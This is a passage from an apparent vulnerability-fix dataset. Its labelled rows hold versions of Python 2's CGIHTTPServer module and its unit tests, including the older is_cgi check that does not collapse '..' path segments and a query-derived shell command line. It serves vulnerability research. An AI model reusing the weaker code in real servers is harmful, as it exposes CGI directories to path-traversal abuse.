            if self.is_python(scriptfile):
                interp = sys.executable
                if interp.lower().endswith(""w.exe""):
                    # On Windows, use python.exe, not pythonw.exe
                    interp = interp[:-5] + interp[-4:]
                cmdline = ""%s -u %s"" % (interp, cmdline)
            if '=' not in query and '""' not in query:
                cmdline = '%s ""%s""' % (cmdline, query)
            self.log_message(""command: %s"", cmdline)
            try:
                nbytes = int(length)
            except (TypeError, ValueError):
                nbytes = 0
            files = popenx(cmdline, 'b')
            fi = files[0]
            fo = files[1]
            if self.have_popen3:
                fe = files[2]
            if self.command.lower() == ""post"" and nbytes > 0:
                data = self.rfile.read(nbytes)
                fi.write(data)
            # throw away additional data [see bug #427345]
            while select.select([self.rfile._sock], [], [], 0)[0]:
                if not self.rfile._sock.recv(1):
                    break
            fi.close()
            shutil.copyfileobj(fo, self.wfile)
            if self.have_popen3:
                errors = fe.read()
                fe.close()
                if errors:
                    self.log_error('%s', errors)
            sts = fo.close()
            if sts:
                self.log_error(""CGI script exit status %#x"", sts)
            else:
                self.log_message(""CGI script exited OK"")

        else:
            # Other O.S. -- execute script in this process
            save_argv = sys.argv
            save_stdin = sys.stdin
            save_stdout = sys.stdout
            save_stderr = sys.stderr
            try:
                save_cwd = os.getcwd()
                try:
                    sys.argv = [scriptfile]
                    if '=' not in decoded_query:
                        sys.argv.append(decoded_query)
                    sys.stdout = self.wfile
                    sys.stdin = self.rfile
                    execfile(scriptfile, {""__name__"": ""__main__""})
                finally:
                    sys.argv = save_argv
                    sys.stdin = save_stdin
                    sys.stdout = save_stdout
                    sys.stderr = save_stderr
                    os.chdir(save_cwd)
            except SystemExit, sts:
                self.log_error(""CGI script exit status %s"", str(sts))
            else:
                self.log_message(""CGI script exited OK"")


nobody = None

def nobody_uid():
    """"""Internal routine to get nobody's uid""""""
    global nobody
    if nobody:
        return nobody
    try:
        import pwd
    except ImportError:
        return -1
    try:
        nobody = pwd.getpwnam('nobody')[2]
    except KeyError:
        nobody = 1 + max(map(lambda x: x[2], pwd.getpwall()))
    return nobody


def executable(path):
    """"""Test for executable file.""""""
    try:
        st = os.stat(path)
    except os.error:
        return False
    return st.st_mode & 0111 != 0


def test(HandlerClass = CGIHTTPRequestHandler,
         ServerClass = BaseHTTPServer.HTTPServer):
    SimpleHTTPServer.test(HandlerClass, ServerClass)


if __name__ == '__main__':
    test()
/n/n/n",1
8,923ba361d8f757f0656cfd216525aca4848e02aa,"Lib/CGIHTTPServer.py/n/n""""""CGI-savvy HTTP Server.

This module builds on SimpleHTTPServer by implementing GET and POST
requests to cgi-bin scripts.

If the os.fork() function is not present (e.g. on Windows),
os.popen2() is used as a fallback, with slightly altered semantics; if
that function is not present either (e.g. on Macintosh), only Python
scripts are supported, and they are executed by the current process.

In all cases, the implementation is intentionally naive -- all
requests are executed sychronously.

SECURITY WARNING: DON'T USE THIS CODE UNLESS YOU ARE INSIDE A FIREWALL
-- it may execute arbitrary Python code or external programs.

Note that status code 200 is sent prior to execution of a CGI script, so
scripts cannot send other status codes such as 302 (redirect).
""""""


__version__ = ""0.4""

__all__ = [""CGIHTTPRequestHandler""]

import os
import sys
import urllib
import BaseHTTPServer
import SimpleHTTPServer
import select


class CGIHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):

    """"""Complete HTTP server with GET, HEAD and POST commands.

    GET and HEAD also support running CGI scripts.

    The POST command is *only* implemented for CGI scripts.

    """"""

    # Determine platform specifics
    have_fork = hasattr(os, 'fork')
    have_popen2 = hasattr(os, 'popen2')
    have_popen3 = hasattr(os, 'popen3')

    # Make rfile unbuffered -- we need to read one line and then pass
    # the rest to a subprocess, so we can't use buffered input.
    rbufsize = 0

    def do_POST(self):
        """"""Serve a POST request.

        This is only implemented for CGI scripts.

        """"""

        if self.is_cgi():
            self.run_cgi()
        else:
            self.send_error(501, ""Can only POST to CGI scripts"")

    def send_head(self):
        """"""Version of send_head that support CGI scripts""""""
        if self.is_cgi():
            return self.run_cgi()
        else:
            return SimpleHTTPServer.SimpleHTTPRequestHandler.send_head(self)

    def is_cgi(self):
        """"""Test whether self.path corresponds to a CGI script.

        Returns True and updates the cgi_info attribute to the tuple
        (dir, rest) if self.path requires running a CGI script.
        Returns False otherwise.

        The default implementation tests whether the normalized url
        path begins with one of the strings in self.cgi_directories
        (and the next character is a '/' or the end of the string).
        """"""
        splitpath = _url_collapse_path_split(self.path)
        if splitpath[0] in self.cgi_directories:
            self.cgi_info = splitpath
            return True
        return False

    cgi_directories = ['/cgi-bin', '/htbin']

    def is_executable(self, path):
        """"""Test whether argument path is an executable file.""""""
        return executable(path)

    def is_python(self, path):
        """"""Test whether argument path is a Python script.""""""
        head, tail = os.path.splitext(path)
        return tail.lower() in ("".py"", "".pyw"")

    def run_cgi(self):
        """"""Execute a CGI script.""""""
        path = self.path
        dir, rest = self.cgi_info

        i = path.find('/', len(dir) + 1)
        while i >= 0:
            nextdir = path[:i]
            nextrest = path[i+1:]

            scriptdir = self.translate_path(nextdir)
            if os.path.isdir(scriptdir):
                dir, rest = nextdir, nextrest
                i = path.find('/', len(dir) + 1)
            else:
                break

        # find an explicit query string, if present.
        i = rest.rfind('?')
        if i >= 0:
            rest, query = rest[:i], rest[i+1:]
        else:
            query = ''

        # dissect the part after the directory name into a script name &
        # a possible additional path, to be stored in PATH_INFO.
        i = rest.find('/')
        if i >= 0:
            script, rest = rest[:i], rest[i:]
        else:
            script, rest = rest, ''

        scriptname = dir + '/' + script
        scriptfile = self.translate_path(scriptname)
        if not os.path.exists(scriptfile):
            self.send_error(404, ""No such CGI script (%r)"" % scriptname)
            return
        if not os.path.isfile(scriptfile):
            self.send_error(403, ""CGI script is not a plain file (%r)"" %
                            scriptname)
            return
        ispy = self.is_python(scriptname)
        if not ispy:
            if not (self.have_fork or self.have_popen2 or self.have_popen3):
                self.send_error(403, ""CGI script is not a Python script (%r)"" %
                                scriptname)
                return
            if not self.is_executable(scriptfile):
                self.send_error(403, ""CGI script is not executable (%r)"" %
                                scriptname)
                return

        # Reference: http://hoohoo.ncsa.uiuc.edu/cgi/env.html
        # XXX Much of the following could be prepared ahead of time!
        env = {}
        env['SERVER_SOFTWARE'] = self.version_string()
        env['SERVER_NAME'] = self.server.server_name
        env['GATEWAY_INTERFACE'] = 'CGI/1.1'
        env['SERVER_PROTOCOL'] = self.protocol_version
        env['SERVER_PORT'] = str(self.server.server_port)
        env['REQUEST_METHOD'] = self.command
        uqrest = urllib.unquote(rest)
        env['PATH_INFO'] = uqrest
        env['PATH_TRANSLATED'] = self.translate_path(uqrest)
        env['SCRIPT_NAME'] = scriptname
        if query:
            env['QUERY_STRING'] = query
        host = self.address_string()
        if host != self.client_address[0]:
            env['REMOTE_HOST'] = host
        env['REMOTE_ADDR'] = self.client_address[0]
        authorization = self.headers.getheader(""authorization"")
        if authorization:
            authorization = authorization.split()
            if len(authorization) == 2:
                import base64, binascii
                env['AUTH_TYPE'] = authorization[0]
                if authorization[0].lower() == ""basic"":
                    try:
                        authorization = base64.decodestring(authorization[1])
                    except binascii.Error:
                        pass
                    else:
                        authorization = authorization.split(':')
                        if len(authorization) == 2:
                            env['REMOTE_USER'] = authorization[0]
        # XXX REMOTE_IDENT
        if self.headers.typeheader is None:
            env['CONTENT_TYPE'] = self.headers.type
        else:
            env['CONTENT_TYPE'] = self.headers.typeheader
        length = self.headers.getheader('content-length')
        if length:
            env['CONTENT_LENGTH'] = length
        referer = self.headers.getheader('referer')
        if referer:
            env['HTTP_REFERER'] = referer
        accept = []
        for line in self.headers.getallmatchingheaders('accept'):
            if line[:1] in ""\t\n\r "":
                accept.append(line.strip())
            else:
                accept = accept + line[7:].split(',')
        env['HTTP_ACCEPT'] = ','.join(accept)
        ua = self.headers.getheader('user-agent')
        if ua:
            env['HTTP_USER_AGENT'] = ua
        co = filter(None, self.headers.getheaders('cookie'))
        if co:
            env['HTTP_COOKIE'] = ', '.join(co)
        # XXX Other HTTP_* headers
        # Since we're setting the env in the parent, provide empty
        # values to override previously set values
        for k in ('QUERY_STRING', 'REMOTE_HOST', 'CONTENT_LENGTH',
                  'HTTP_USER_AGENT', 'HTTP_COOKIE', 'HTTP_REFERER'):
            env.setdefault(k, """")
        os.environ.update(env)

        self.send_response(200, ""Script output follows"")

        decoded_query = query.replace('+', ' ')

        if self.have_fork:
            # Unix -- fork as we should
            args = [script]
            if '=' not in decoded_query:
                args.append(decoded_query)
            nobody = nobody_uid()
            self.wfile.flush() # Always flush before forking
            pid = os.fork()
            if pid != 0:
                # Parent
                pid, sts = os.waitpid(pid, 0)
                # throw away additional data [see bug #427345]
                while select.select([self.rfile], [], [], 0)[0]:
                    if not self.rfile.read(1):
                        break
                if sts:
                    self.log_error(""CGI script exit status %#x"", sts)
                return
            # Child
            try:
                try:
                    os.setuid(nobody)
                except os.error:
                    pass
                os.dup2(self.rfile.fileno(), 0)
                os.dup2(self.wfile.fileno(), 1)
                os.execve(scriptfile, args, os.environ)
            except:
                self.server.handle_error(self.request, self.client_address)
                os._exit(127)

        elif self.have_popen2 or self.have_popen3:
            # Windows -- use popen2 or popen3 to create a subprocess
            import shutil
            if self.have_popen3:
                popenx = os.popen3
            else:
                popenx = os.popen2
            cmdline = scriptfile
            if self.is_python(scriptfile):
                interp = sys.executable
                if interp.lower().endswith(""w.exe""):
                    # On Windows, use python.exe, not pythonw.exe
                    interp = interp[:-5] + interp[-4:]
                cmdline = ""%s -u %s"" % (interp, cmdline)
            if '=' not in query and '""' not in query:
                cmdline = '%s ""%s""' % (cmdline, query)
            self.log_message(""command: %s"", cmdline)
            try:
                nbytes = int(length)
            except (TypeError, ValueError):
                nbytes = 0
            files = popenx(cmdline, 'b')
            fi = files[0]
            fo = files[1]
            if self.have_popen3:
                fe = files[2]
            if self.command.lower() == ""post"" and nbytes > 0:
                data = self.rfile.read(nbytes)
                fi.write(data)
            # throw away additional data [see bug #427345]
            while select.select([self.rfile._sock], [], [], 0)[0]:
                if not self.rfile._sock.recv(1):
                    break
            fi.close()
            shutil.copyfileobj(fo, self.wfile)
            if self.have_popen3:
                errors = fe.read()
                fe.close()
                if errors:
                    self.log_error('%s', errors)
            sts = fo.close()
            if sts:
                self.log_error(""CGI script exit status %#x"", sts)
            else:
                self.log_message(""CGI script exited OK"")

        else:
            # Other O.S. -- execute script in this process
            save_argv = sys.argv
            save_stdin = sys.stdin
            save_stdout = sys.stdout
            save_stderr = sys.stderr
            try:
                save_cwd = os.getcwd()
                try:
                    sys.argv = [scriptfile]
                    if '=' not in decoded_query:
                        sys.argv.append(decoded_query)
                    sys.stdout = self.wfile
                    sys.stdin = self.rfile
                    execfile(scriptfile, {""__name__"": ""__main__""})
                finally:
                    sys.argv = save_argv
                    sys.stdin = save_stdin
                    sys.stdout = save_stdout
                    sys.stderr = save_stderr
                    os.chdir(save_cwd)
            except SystemExit, sts:
                self.log_error(""CGI script exit status %s"", str(sts))
            else:
                self.log_message(""CGI script exited OK"")


# TODO(gregory.p.smith): Move this into an appropriate library.
def _url_collapse_path_split(path):
    """"""
    Given a URL path, remove extra '/'s and '.' path elements and collapse
    any '..' references.

    Implements something akin to RFC-2396 5.2 step 6 to parse relative paths.

    Returns: A tuple of (head, tail) where tail is everything after the final /
    and head is everything before it.  Head will always start with a '/' and,
    if it contains anything else, never have a trailing '/'.

    Raises: IndexError if too many '..' occur within the path.
    """"""
    # Similar to os.path.split(os.path.normpath(path)) but specific to URL
    # path semantics rather than local operating system semantics.
    path_parts = []
    for part in path.split('/'):
        if part == '.':
            path_parts.append('')
        else:
            path_parts.append(part)
    # Filter out blank non trailing parts before consuming the '..'.
    path_parts = [part for part in path_parts[:-1] if part] + path_parts[-1:]
    if path_parts:
        tail_part = path_parts.pop()
    else:
        tail_part = ''
    head_parts = []
    for part in path_parts:
        if part == '..':
            head_parts.pop()
        else:
            head_parts.append(part)
    if tail_part and tail_part == '..':
        head_parts.pop()
        tail_part = ''
    return ('/' + '/'.join(head_parts), tail_part)


nobody = None

def nobody_uid():
    """"""Internal routine to get nobody's uid""""""
    global nobody
    if nobody:
        return nobody
    try:
        import pwd
    except ImportError:
        return -1
    try:
        nobody = pwd.getpwnam('nobody')[2]
    except KeyError:
        nobody = 1 + max(map(lambda x: x[2], pwd.getpwall()))
    return nobody


def executable(path):
    """"""Test for executable file.""""""
    try:
        st = os.stat(path)
    except os.error:
        return False
    return st.st_mode & 0111 != 0


def test(HandlerClass = CGIHTTPRequestHandler,
         ServerClass = BaseHTTPServer.HTTPServer):
    SimpleHTTPServer.test(HandlerClass, ServerClass)


if __name__ == '__main__':
    test()
/n/n/nLib/test/test_httpservers.py/n/n""""""Unittests for the various HTTPServer modules.

Written by Cody A.W. Somerville <cody-somerville@ubuntu.com>,
Josip Dzolonga, and Michael Otteneder for the 2007/08 GHOP contest.
""""""

from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
from SimpleHTTPServer import SimpleHTTPRequestHandler
from CGIHTTPServer import CGIHTTPRequestHandler
import CGIHTTPServer

import os
import sys
import base64
import shutil
import urllib
import httplib
import tempfile
import threading

import unittest
from test import test_support


class NoLogRequestHandler:
    def log_message(self, *args):
        # don't write log messages to stderr
        pass


class TestServerThread(threading.Thread):
    def __init__(self, test_object, request_handler):
        threading.Thread.__init__(self)
        self.request_handler = request_handler
        self.test_object = test_object
        self.test_object.lock.acquire()

    def run(self):
        self.server = HTTPServer(('', 0), self.request_handler)
        self.test_object.PORT = self.server.socket.getsockname()[1]
        self.test_object.lock.release()
        try:
            self.server.serve_forever()
        finally:
            self.server.server_close()

    def stop(self):
        self.server.shutdown()


class BaseTestCase(unittest.TestCase):
    def setUp(self):
        self.lock = threading.Lock()
        self.thread = TestServerThread(self, self.request_handler)
        self.thread.start()
        self.lock.acquire()

    def tearDown(self):
        self.lock.release()
        self.thread.stop()

    def request(self, uri, method='GET', body=None, headers={}):
        self.connection = httplib.HTTPConnection('localhost', self.PORT)
        self.connection.request(method, uri, body, headers)
        return self.connection.getresponse()


class BaseHTTPServerTestCase(BaseTestCase):
    class request_handler(NoLogRequestHandler, BaseHTTPRequestHandler):
        protocol_version = 'HTTP/1.1'
        default_request_version = 'HTTP/1.1'

        def do_TEST(self):
            self.send_response(204)
            self.send_header('Content-Type', 'text/html')
            self.send_header('Connection', 'close')
            self.end_headers()

        def do_KEEP(self):
            self.send_response(204)
            self.send_header('Content-Type', 'text/html')
            self.send_header('Connection', 'keep-alive')
            self.end_headers()

        def do_KEYERROR(self):
            self.send_error(999)

        def do_CUSTOM(self):
            self.send_response(999)
            self.send_header('Content-Type', 'text/html')
            self.send_header('Connection', 'close')
            self.end_headers()

    def setUp(self):
        BaseTestCase.setUp(self)
        self.con = httplib.HTTPConnection('localhost', self.PORT)
        self.con.connect()

    def test_command(self):
        self.con.request('GET', '/')
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_request_line_trimming(self):
        self.con._http_vsn_str = 'HTTP/1.1\n'
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_version_bogus(self):
        self.con._http_vsn_str = 'FUBAR'
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 400)

    def test_version_digits(self):
        self.con._http_vsn_str = 'HTTP/9.9.9'
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 400)

    def test_version_none_get(self):
        self.con._http_vsn_str = ''
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_version_none(self):
        self.con._http_vsn_str = ''
        self.con.putrequest('PUT', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 400)

    def test_version_invalid(self):
        self.con._http_vsn = 99
        self.con._http_vsn_str = 'HTTP/9.9'
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 505)

    def test_send_blank(self):
        self.con._http_vsn_str = ''
        self.con.putrequest('', '')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 400)

    def test_header_close(self):
        self.con.putrequest('GET', '/')
        self.con.putheader('Connection', 'close')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_head_keep_alive(self):
        self.con._http_vsn_str = 'HTTP/1.1'
        self.con.putrequest('GET', '/')
        self.con.putheader('Connection', 'keep-alive')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_handler(self):
        self.con.request('TEST', '/')
        res = self.con.getresponse()
        self.assertEquals(res.status, 204)

    def test_return_header_keep_alive(self):
        self.con.request('KEEP', '/')
        res = self.con.getresponse()
        self.assertEquals(res.getheader('Connection'), 'keep-alive')
        self.con.request('TEST', '/')

    def test_internal_key_error(self):
        self.con.request('KEYERROR', '/')
        res = self.con.getresponse()
        self.assertEquals(res.status, 999)

    def test_return_custom_status(self):
        self.con.request('CUSTOM', '/')
        res = self.con.getresponse()
        self.assertEquals(res.status, 999)


class SimpleHTTPServerTestCase(BaseTestCase):
    class request_handler(NoLogRequestHandler, SimpleHTTPRequestHandler):
        pass

    def setUp(self):
        BaseTestCase.setUp(self)
        self.cwd = os.getcwd()
        basetempdir = tempfile.gettempdir()
        os.chdir(basetempdir)
        self.data = 'We are the knights who say Ni!'
        self.tempdir = tempfile.mkdtemp(dir=basetempdir)
        self.tempdir_name = os.path.basename(self.tempdir)
        temp = open(os.path.join(self.tempdir, 'test'), 'wb')
        temp.write(self.data)
        temp.close()

    def tearDown(self):
        try:
            os.chdir(self.cwd)
            try:
                shutil.rmtree(self.tempdir)
            except:
                pass
        finally:
            BaseTestCase.tearDown(self)

    def check_status_and_reason(self, response, status, data=None):
        body = response.read()
        self.assert_(response)
        self.assertEquals(response.status, status)
        self.assert_(response.reason != None)
        if data:
            self.assertEqual(data, body)

    def test_get(self):
        #constructs the path relative to the root directory of the HTTPServer
        response = self.request(self.tempdir_name + '/test')
        self.check_status_and_reason(response, 200, data=self.data)
        response = self.request(self.tempdir_name + '/')
        self.check_status_and_reason(response, 200)
        response = self.request(self.tempdir_name)
        self.check_status_and_reason(response, 301)
        response = self.request('/ThisDoesNotExist')
        self.check_status_and_reason(response, 404)
        response = self.request('/' + 'ThisDoesNotExist' + '/')
        self.check_status_and_reason(response, 404)
        f = open(os.path.join(self.tempdir_name, 'index.html'), 'w')
        response = self.request('/' + self.tempdir_name + '/')
        self.check_status_and_reason(response, 200)
        if os.name == 'posix':
            # chmod won't work as expected on Windows platforms
            os.chmod(self.tempdir, 0)
            response = self.request(self.tempdir_name + '/')
            self.check_status_and_reason(response, 404)
            os.chmod(self.tempdir, 0755)

    def test_head(self):
        response = self.request(
            self.tempdir_name + '/test', method='HEAD')
        self.check_status_and_reason(response, 200)
        self.assertEqual(response.getheader('content-length'),
                         str(len(self.data)))
        self.assertEqual(response.getheader('content-type'),
                         'application/octet-stream')

    def test_invalid_requests(self):
        response = self.request('/', method='FOO')
        self.check_status_and_reason(response, 501)
        # requests must be case sensitive,so this should fail too
        response = self.request('/', method='get')
        self.check_status_and_reason(response, 501)
        response = self.request('/', method='GETs')
        self.check_status_and_reason(response, 501)


cgi_file1 = """"""\
#!%s

print ""Content-type: text/html""
print
print ""Hello World""
""""""

cgi_file2 = """"""\
#!%s
import cgi

print ""Content-type: text/html""
print

form = cgi.FieldStorage()
print ""%%s, %%s, %%s"" %% (form.getfirst(""spam""), form.getfirst(""eggs""),\
              form.getfirst(""bacon""))
""""""

class CGIHTTPServerTestCase(BaseTestCase):
    class request_handler(NoLogRequestHandler, CGIHTTPRequestHandler):
        pass

    def setUp(self):
        BaseTestCase.setUp(self)
        self.parent_dir = tempfile.mkdtemp()
        self.cgi_dir = os.path.join(self.parent_dir, 'cgi-bin')
        os.mkdir(self.cgi_dir)

        self.file1_path = os.path.join(self.cgi_dir, 'file1.py')
        with open(self.file1_path, 'w') as file1:
            file1.write(cgi_file1 % sys.executable)
        os.chmod(self.file1_path, 0777)

        self.file2_path = os.path.join(self.cgi_dir, 'file2.py')
        with open(self.file2_path, 'w') as file2:
            file2.write(cgi_file2 % sys.executable)
        os.chmod(self.file2_path, 0777)

        self.cwd = os.getcwd()
        os.chdir(self.parent_dir)

    def tearDown(self):
        try:
            os.chdir(self.cwd)
            os.remove(self.file1_path)
            os.remove(self.file2_path)
            os.rmdir(self.cgi_dir)
            os.rmdir(self.parent_dir)
        finally:
            BaseTestCase.tearDown(self)

    def test_url_collapse_path_split(self):
        test_vectors = {
            '': ('/', ''),
            '..': IndexError,
            '/.//..': IndexError,
            '/': ('/', ''),
            '//': ('/', ''),
            '/\\': ('/', '\\'),
            '/.//': ('/', ''),
            'cgi-bin/file1.py': ('/cgi-bin', 'file1.py'),
            '/cgi-bin/file1.py': ('/cgi-bin', 'file1.py'),
            'a': ('/', 'a'),
            '/a': ('/', 'a'),
            '//a': ('/', 'a'),
            './a': ('/', 'a'),
            './C:/': ('/C:', ''),
            '/a/b': ('/a', 'b'),
            '/a/b/': ('/a/b', ''),
            '/a/b/c/..': ('/a/b', ''),
            '/a/b/c/../d': ('/a/b', 'd'),
            '/a/b/c/../d/e/../f': ('/a/b/d', 'f'),
            '/a/b/c/../d/e/../../f': ('/a/b', 'f'),
            '/a/b/c/../d/e/.././././..//f': ('/a/b', 'f'),
            '../a/b/c/../d/e/.././././..//f': IndexError,
            '/a/b/c/../d/e/../../../f': ('/a', 'f'),
            '/a/b/c/../d/e/../../../../f': ('/', 'f'),
            '/a/b/c/../d/e/../../../../../f': IndexError,
            '/a/b/c/../d/e/../../../../f/..': ('/', ''),
        }
        for path, expected in test_vectors.iteritems():
            if isinstance(expected, type) and issubclass(expected, Exception):
                self.assertRaises(expected,
                                  CGIHTTPServer._url_collapse_path_split, path)
            else:
                actual = CGIHTTPServer._url_collapse_path_split(path)
                self.assertEquals(expected, actual,
                                  msg='path = %r\nGot:    %r\nWanted: %r' % (
                                  path, actual, expected))

    def test_headers_and_content(self):
        res = self.request('/cgi-bin/file1.py')
        self.assertEquals(('Hello World\n', 'text/html', 200), \
             (res.read(), res.getheader('Content-type'), res.status))

    def test_post(self):
        params = urllib.urlencode({'spam' : 1, 'eggs' : 'python', 'bacon' : 123456})
        headers = {'Content-type' : 'application/x-www-form-urlencoded'}
        res = self.request('/cgi-bin/file2.py', 'POST', params, headers)

        self.assertEquals(res.read(), '1, python, 123456\n')

    def test_invaliduri(self):
        res = self.request('/cgi-bin/invalid')
        res.read()
        self.assertEquals(res.status, 404)

    def test_authorization(self):
        headers = {'Authorization' : 'Basic %s' % \
                base64.b64encode('username:pass')}
        res = self.request('/cgi-bin/file1.py', 'GET', headers=headers)
        self.assertEquals(('Hello World\n', 'text/html', 200), \
             (res.read(), res.getheader('Content-type'), res.status))

    def test_no_leading_slash(self):
        # http://bugs.python.org/issue2254
        res = self.request('cgi-bin/file1.py')
        self.assertEquals(('Hello World\n', 'text/html', 200),
             (res.read(), res.getheader('Content-type'), res.status))


def test_main(verbose=None):
    try:
        cwd = os.getcwd()
        test_support.run_unittest(BaseHTTPServerTestCase,
                                  SimpleHTTPServerTestCase,
                                  CGIHTTPServerTestCase
                                  )
    finally:
        os.chdir(cwd)

if __name__ == '__main__':
    test_main()
/n/n/n",0
9,923ba361d8f757f0656cfd216525aca4848e02aa,"/Lib/CGIHTTPServer.py/n/n""""""CGI-savvy HTTP Server.

This module builds on SimpleHTTPServer by implementing GET and POST
requests to cgi-bin scripts.

If the os.fork() function is not present (e.g. on Windows),
os.popen2() is used as a fallback, with slightly altered semantics; if
that function is not present either (e.g. on Macintosh), only Python
scripts are supported, and they are executed by the current process.

In all cases, the implementation is intentionally naive -- all
requests are executed sychronously.

SECURITY WARNING: DON'T USE THIS CODE UNLESS YOU ARE INSIDE A FIREWALL
-- it may execute arbitrary Python code or external programs.

Note that status code 200 is sent prior to execution of a CGI script, so
scripts cannot send other status codes such as 302 (redirect).
""""""


__version__ = ""0.4""

__all__ = [""CGIHTTPRequestHandler""]

import os
import sys
import urllib
import BaseHTTPServer
import SimpleHTTPServer
import select


class CGIHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):

    """"""Complete HTTP server with GET, HEAD and POST commands.

    GET and HEAD also support running CGI scripts.

    The POST command is *only* implemented for CGI scripts.

    """"""

    # Determine platform specifics
    have_fork = hasattr(os, 'fork')
    have_popen2 = hasattr(os, 'popen2')
    have_popen3 = hasattr(os, 'popen3')

    # Make rfile unbuffered -- we need to read one line and then pass
    # the rest to a subprocess, so we can't use buffered input.
    rbufsize = 0

    def do_POST(self):
        """"""Serve a POST request.

        This is only implemented for CGI scripts.

        """"""

        if self.is_cgi():
            self.run_cgi()
        else:
            self.send_error(501, ""Can only POST to CGI scripts"")

    def send_head(self):
        """"""Version of send_head that support CGI scripts""""""
        if self.is_cgi():
            return self.run_cgi()
        else:
            return SimpleHTTPServer.SimpleHTTPRequestHandler.send_head(self)

    def is_cgi(self):
        """"""Test whether self.path corresponds to a CGI script,
        and return a boolean.

        This function sets self.cgi_info to a tuple (dir, rest)
        when it returns True, where dir is the directory part before
        the CGI script name.  Note that rest begins with a
        slash if it is not empty.

        The default implementation tests whether the path
        begins with one of the strings in the list
        self.cgi_directories (and the next character is a '/'
        or the end of the string).
        """"""

        path = self.path

        for x in self.cgi_directories:
            i = len(x)
            if path[:i] == x and (not path[i:] or path[i] == '/'):
                self.cgi_info = path[:i], path[i+1:]
                return True
        return False

    cgi_directories = ['/cgi-bin', '/htbin']

    def is_executable(self, path):
        """"""Test whether argument path is an executable file.""""""
        return executable(path)

    def is_python(self, path):
        """"""Test whether argument path is a Python script.""""""
        head, tail = os.path.splitext(path)
        return tail.lower() in ("".py"", "".pyw"")

    def run_cgi(self):
        """"""Execute a CGI script.""""""
        path = self.path
        dir, rest = self.cgi_info

        i = path.find('/', len(dir) + 1)
        while i >= 0:
            nextdir = path[:i]
            nextrest = path[i+1:]

            scriptdir = self.translate_path(nextdir)
            if os.path.isdir(scriptdir):
                dir, rest = nextdir, nextrest
                i = path.find('/', len(dir) + 1)
            else:
                break

        # find an explicit query string, if present.
        i = rest.rfind('?')
        if i >= 0:
            rest, query = rest[:i], rest[i+1:]
        else:
            query = ''

        # dissect the part after the directory name into a script name &
        # a possible additional path, to be stored in PATH_INFO.
        i = rest.find('/')
        if i >= 0:
            script, rest = rest[:i], rest[i:]
        else:
            script, rest = rest, ''

        scriptname = dir + '/' + script
        scriptfile = self.translate_path(scriptname)
        if not os.path.exists(scriptfile):
            self.send_error(404, ""No such CGI script (%r)"" % scriptname)
            return
        if not os.path.isfile(scriptfile):
            self.send_error(403, ""CGI script is not a plain file (%r)"" %
                            scriptname)
            return
        ispy = self.is_python(scriptname)
        if not ispy:
            if not (self.have_fork or self.have_popen2 or self.have_popen3):
                self.send_error(403, ""CGI script is not a Python script (%r)"" %
                                scriptname)
                return
            if not self.is_executable(scriptfile):
                self.send_error(403, ""CGI script is not executable (%r)"" %
                                scriptname)
                return

        # Reference: http://hoohoo.ncsa.uiuc.edu/cgi/env.html
        # XXX Much of the following could be prepared ahead of time!
        env = {}
        env['SERVER_SOFTWARE'] = self.version_string()
        env['SERVER_NAME'] = self.server.server_name
        env['GATEWAY_INTERFACE'] = 'CGI/1.1'
        env['SERVER_PROTOCOL'] = self.protocol_version
        env['SERVER_PORT'] = str(self.server.server_port)
        env['REQUEST_METHOD'] = self.command
        uqrest = urllib.unquote(rest)
        env['PATH_INFO'] = uqrest
        env['PATH_TRANSLATED'] = self.translate_path(uqrest)
        env['SCRIPT_NAME'] = scriptname
        if query:
            env['QUERY_STRING'] = query
        host = self.address_string()
        if host != self.client_address[0]:
            env['REMOTE_HOST'] = host
        env['REMOTE_ADDR'] = self.client_address[0]
        authorization = self.headers.getheader(""authorization"")
        if authorization:
            authorization = authorization.split()
            if len(authorization) == 2:
                import base64, binascii
                env['AUTH_TYPE'] = authorization[0]
                if authorization[0].lower() == ""basic"":
                    try:
                        authorization = base64.decodestring(authorization[1])
                    except binascii.Error:
                        pass
                    else:
                        authorization = authorization.split(':')
                        if len(authorization) == 2:
                            env['REMOTE_USER'] = authorization[0]
        # XXX REMOTE_IDENT
        if self.headers.typeheader is None:
            env['CONTENT_TYPE'] = self.headers.type
        else:
            env['CONTENT_TYPE'] = self.headers.typeheader
        length = self.headers.getheader('content-length')
        if length:
            env['CONTENT_LENGTH'] = length
        referer = self.headers.getheader('referer')
        if referer:
            env['HTTP_REFERER'] = referer
        accept = []
        for line in self.headers.getallmatchingheaders('accept'):
            if line[:1] in ""\t\n\r "":
                accept.append(line.strip())
            else:
                accept = accept + line[7:].split(',')
        env['HTTP_ACCEPT'] = ','.join(accept)
        ua = self.headers.getheader('user-agent')
        if ua:
            env['HTTP_USER_AGENT'] = ua
        co = filter(None, self.headers.getheaders('cookie'))
        if co:
            env['HTTP_COOKIE'] = ', '.join(co)
        # XXX Other HTTP_* headers
        # Since we're setting the env in the parent, provide empty
        # values to override previously set values
        for k in ('QUERY_STRING', 'REMOTE_HOST', 'CONTENT_LENGTH',
                  'HTTP_USER_AGENT', 'HTTP_COOKIE', 'HTTP_REFERER'):
            env.setdefault(k, """")
        os.environ.update(env)

        self.send_response(200, ""Script output follows"")

        decoded_query = query.replace('+', ' ')

        if self.have_fork:
            # Unix -- fork as we should
            args = [script]
            if '=' not in decoded_query:
                args.append(decoded_query)
            nobody = nobody_uid()
            self.wfile.flush() # Always flush before forking
            pid = os.fork()
            if pid != 0:
                # Parent
                pid, sts = os.waitpid(pid, 0)
                # throw away additional data [see bug #427345]
                while select.select([self.rfile], [], [], 0)[0]:
